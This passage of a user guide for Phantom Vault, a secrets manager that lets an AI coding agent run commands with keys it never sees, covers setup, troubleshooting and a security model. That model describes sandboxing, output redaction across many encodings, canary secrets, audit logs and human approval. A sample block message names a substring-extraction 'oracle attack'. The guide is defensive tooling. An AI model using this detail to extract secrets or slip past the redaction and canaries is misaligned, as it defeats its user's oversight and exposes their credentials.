---

## 13. Migrating from .env Files

If you currently have secrets in `.env` files (most developers do), here's how to migrate.

### Import All Keys from a .env File

```
ryan@macbook ~ % phantom import .env

  Reading .env file...

  Found 8 secrets:
    STRIPE_SECRET_KEY
    STRIPE_PUBLISHABLE_KEY
    CLERK_SECRET_KEY
    CLERK_PUBLISHABLE_KEY
    DATABASE_URL
    RAILWAY_TOKEN
    ELEVENLABS_API_KEY
    NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY

  Import all 8 secrets into namespace 'default'? [Y/n]: y

  ✓ Imported 8 secrets
  ✓ Audit log updated

  ⚠ IMPORTANT: Now delete your .env file:
    rm .env

  ⚠ Add .env to your .gitignore if not already:
    echo '.env' >> .gitignore
```

`phantom import` takes a single argument — the path to the `.env` file (`phantom import <PATH>`). It has no `--namespace` or `--tags` flag; secrets import into your current default namespace. Switch namespaces first with `phantom namespace use <name>` if you want them to land elsewhere:

```
ryan@macbook ~ % phantom namespace use ib365
ryan@macbook ~ % phantom import .env.production

  ✓ Imported 8 secrets into namespace 'ib365'
```

---

## 14. Team Setup

Each team member runs their own Phantom Vault. Secrets are not shared between vaults — each person stores their own copy of the keys they need. This is intentional: shared vaults create shared risk.

### New Team Member Onboarding

Have each new team member run these commands:

```
# 1. Install Phantom Vault
ryan@macbook ~ % brew tap phantomvault/tap && brew install phantom-vault

# 2. Initialize their vault
ryan@macbook ~ % phantom init

# 3. Create project namespaces
ryan@macbook ~ % phantom namespace create ib365
ryan@macbook ~ % phantom namespace create advancedpsych

# 4. Add their secrets (provided by team lead securely)
ryan@macbook ~ % phantom add STRIPE_SECRET_KEY --namespace ib365
ryan@macbook ~ % phantom add DATABASE_URL --namespace ib365
ryan@macbook ~ % phantom add CLERK_SECRET_KEY --namespace ib365
ryan@macbook ~ % phantom add RAILWAY_TOKEN --namespace ib365

# 5. Connect to Claude Code
ryan@macbook ~ % phantom mcp install

# 6. Restart Claude Code — done
```

---

## 15. Troubleshooting

### "phantom: command not found"

```
ryan@macbook ~ % phantom --version
zsh: command not found: phantom
```

**Fix:** The binary isn't in your PATH. Try:

```
ryan@macbook ~ % export PATH="$PATH:/usr/local/bin"
ryan@macbook ~ % phantom --version
phantom 0.1.0
```

To make this permanent, add the export line to your `~/.zshrc` (Mac) or `~/.bashrc` (Linux).

### Touch ID Not Appearing

**Fix:** Your terminal app needs biometric permission. Go to:
System Preferences → Privacy & Security → Touch ID & Passwords → Terminal (enable it)

### vault_run Returns BLOCKED for a Legitimate Command

```
ryan@macbook ~ % phantom run -s KEY -- your-command-here

  ✗ BLOCKED
  Reason: ...
```

**Fix:** If it's a false positive, adjust your policy. Write your rules to a policy file and apply it, or view/reset the current policy:

```
ryan@macbook ~ % phantom policy show
ryan@macbook ~ % phantom policy set my-policy.toml
```

### MCP Server Not Connecting

```
ryan@macbook ~ % phantom mcp status
  Configuration: ✗ Not found in settings
```

**Fix:**

```
ryan@macbook ~ % phantom mcp install
# Then restart Claude Code
```

### Rate Limit Exceeded

```
  ✗ Rate limit exceeded: 10 vault_run calls per minute
  Wait 47 seconds or increase limit in config.toml
```

**Fix:** Wait, or increase the limit:

```
# Edit ~/.phantom/config.toml
max_runs_per_minute = 20
```

### Vault Locked (Timeout)

```
  ✗ Vault is locked (idle timeout)
```

**Fix:** There is no separate unlock command. Just run any command that needs the vault (for example `phantom list`) and authenticate when prompted — Touch ID if biometric is enrolled, otherwise your master password:

```
ryan@macbook ~ % phantom list
[Touch ID prompt]
✓ Vault unlocked
  ... secrets listed ...
```

---

## 16. Complete Command Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  PHANTOM VAULT — QUICK REFERENCE                                             │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  SETUP                                                                       │
│  phantom init                          Create your vault                     │
│  phantom init --biometric              Create vault + enable Touch ID        │
│  phantom mcp install                   Connect to Claude Code                │
│                                                                              │
│  SECRETS                                                                     │
│  phantom add KEY_NAME                  Store a new secret (interactive)       │
│  phantom add KEY --from-env VAR        Store from an environment variable     │
│  phantom list                          List all secrets (names only)         │
│  phantom show KEY_NAME --masked        Show last 4 chars                      │
│  phantom get KEY_NAME                  Get full value (human/TTY only)        │
│  phantom remove KEY_NAME               Delete a secret                       │
│  phantom rotate KEY_NAME               Rotate a secret (new value)           │
│  phantom import PATH                    Import from a .env file               │
│  phantom edit                          Bulk-edit vault in $EDITOR (TTY only)  │
│                                                                              │
│  RUNNING COMMANDS                                                            │
│  phantom run -s KEY -- cmd             Run command with secret injected      │
│  phantom run -s KEY=VAR -- cmd         Inject under a different var name      │
│                                                                              │
│  NAMESPACES                                                                  │
│  phantom namespace create NAME         Create a namespace                    │
│  phantom namespace list                List all namespaces                   │
│  phantom namespace use NAME            Change default namespace              │
│  phantom namespace delete NAME         Delete a namespace                    │
│                                                                              │
│  BIOMETRIC (macOS)                                                           │
│  phantom biometric status              Check Touch ID status                 │
│  phantom biometric enable              Enable Touch ID unlock                │
│  phantom biometric disable             Disable Touch ID unlock               │
│                                                                              │
│  HEALTH & ROTATION                                                           │
│  phantom health                        Check vault and secret health         │
│  phantom audit --last N                View last N audit entries             │
│                                                                              │
│  CANARIES                                                                    │
│  phantom canary create NAME            Plant a honeypot secret               │
│  phantom canary list                   List canary secrets                   │
│  phantom canary delete NAME            Delete a canary                       │
│                                                                              │
│  POLICY                                                                      │
│  phantom policy show                   View current rules                    │
│  phantom policy set FILE               Apply a policy file                   │
│  phantom policy reset                  Reset to secure defaults              │
│                                                                              │
│  GUARDRAILS                                                                  │
│  phantom guardrail set NAME --cap 50 --provider openai   Cap monthly spend   │
│  phantom guardrail status              Usage vs cap for every guardrail      │
│                                                                              │
│  MAINTENANCE                                                                 │
│  phantom passwd                        Change master password (re-encrypts)  │
│  phantom update                        Update to the latest version         │
│                                                                              │
│  HELP                                                                        │
│  phantom --help                        Full command listing                  │
│  phantom <command> --help              Help for any command                  │
│  phantom --version                     Show version                          │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 17. What Your AI Agent Sees (MCP Tools)

When Claude Code connects to Phantom Vault, it gets access to exactly 6 tools. Here's what each one returns:

### vault_list

**What Claude sees:**

```json
[
  {
    "name": "STRIPE_SECRET_KEY",
    "namespace": "default",
    "created": "2026-02-27",
    "expires": null,
    "access_count": 3
  }
]
```

**What Claude does NOT see:** The actual key value. Ever.

### vault_exists

**What Claude sees:**

```json
{
  "exists": true,
  "name": "STRIPE_SECRET_KEY",
  "namespace": "default"
}
```

### vault_masked

**What Claude sees:**

```json
{
  "name": "STRIPE_SECRET_KEY",
  "masked": "••••••••••••rXYZ"
}
```

Only the last 4 characters. Enough to confirm which key, not enough to use it.

### vault_run

**What Claude sees (successful command):**

```json
{
  "exit_code": 0,
  "stdout": "Deploy successful. Live at https://myapp.railway.app",
  "stderr": "",
  "duration_ms": 4200,
  "redactions": 0
}
```

**What Claude sees (if the secret leaked in output):**

```json
{
  "exit_code": 0,
  "stdout": "Connected with key [REDACTED:STRIPE_SECRET_KEY]",
  "stderr": "",
  "duration_ms": 1200,
  "redactions": 1
}
```

**What Claude sees (blocked command):**

```json
{
  "error": "BLOCKED",
  "reason": "Oracle attack: substring extraction detected (${VAR:0:1})",
  "category": "SUBSTRING_EXTRACTION",
  "risk_score": 100
}
```

### vault_health

```json
{
  "secrets_total": 5,
  "warnings": [
    {"name": "DATABASE_URL", "issue": "expires in 12 days"},
    {"name": "CLERK_KEY", "issue": "95 days old, rotation recommended"}
  ],
  "canaries_active": 3,
  "canaries_triggered": 0,
  "audit_chain_valid": true
}
```

### vault_rotate

```json
{
  "status": "pending_human_approval",
  "message": "Rotation for STRIPE_SECRET_KEY requires biometric confirmation via CLI. Run: phantom rotate STRIPE_SECRET_KEY"
}
```

The AI agent **cannot** rotate secrets on its own. It can request rotation, but you must approve it with Touch ID in your terminal.

---

## 18. Security Model (Plain English)

### The Problem

When you use an AI coding assistant, it can read your `.env` files. That means your Stripe key, your database password, your Clerk secret — all visible to the AI. If the AI's conversation is logged, cached, or used for training, your keys go with it. If the AI is tricked by a prompt injection attack, it could send your keys to an attacker.

### The Solution: 5 Layers of Defense

**Layer 0 — Your encryption key lives in hardware.**
On Apple Silicon Macs, the key that encrypts your vault is generated inside the Secure Enclave — a dedicated security chip. It physically cannot be extracted. Not by software, not by the operating system, not by anyone. You unlock it with your fingerprint.

**Layer 1 — Your secrets are double-encrypted.**
Each secret is encrypted with two different algorithms (AES-256-GCM and XChaCha20-Poly1305). Each encryption uses a unique random number. The encrypted data sits in an SQLite database with strict file permissions. The memory holding your secrets is locked (can't be swapped to disk) and zeroed when done.

**Layer 2 — Commands run in a sandbox.**
When a command needs your secret, it runs in an isolated process that can only connect to approved servers. The secret exists only as an environment variable in that process. When the process ends, the memory is wiped.

**Layer 3 — Output is scanned before the AI sees it.**
Before any command output goes back to the AI, Phantom scans it for your secret in 15+ formats: the original text, Base64 encoded, URL encoded, hex, HTML entities, reversed, ROT13, and more. If any trace is found, it's replaced with [REDACTED]. If the scan itself fails, the output is blocked entirely — it never passes through raw.

**Layer 4 — Everything is logged and monitored.**
Every access is recorded in a tamper-evident audit trail. Fake "canary" secrets detect probing. Anomalous patterns trigger alerts. If someone modifies the log, the integrity chain breaks and you'll know.

### What Makes This Different from a Password Manager

A password manager (1Password, Bitwarden) stores secrets and gives them back to you when you ask. Phantom Vault stores secrets and **uses them on your behalf** without ever giving them back. The AI agent never receives the secret — it only receives the result of a command that used the secret, after that result has been scanned and sanitized.

---

*Phantom Vault is open source under the Apache 2.0 license.*
*Report issues at github.com/phantomvault/phantom-vault*
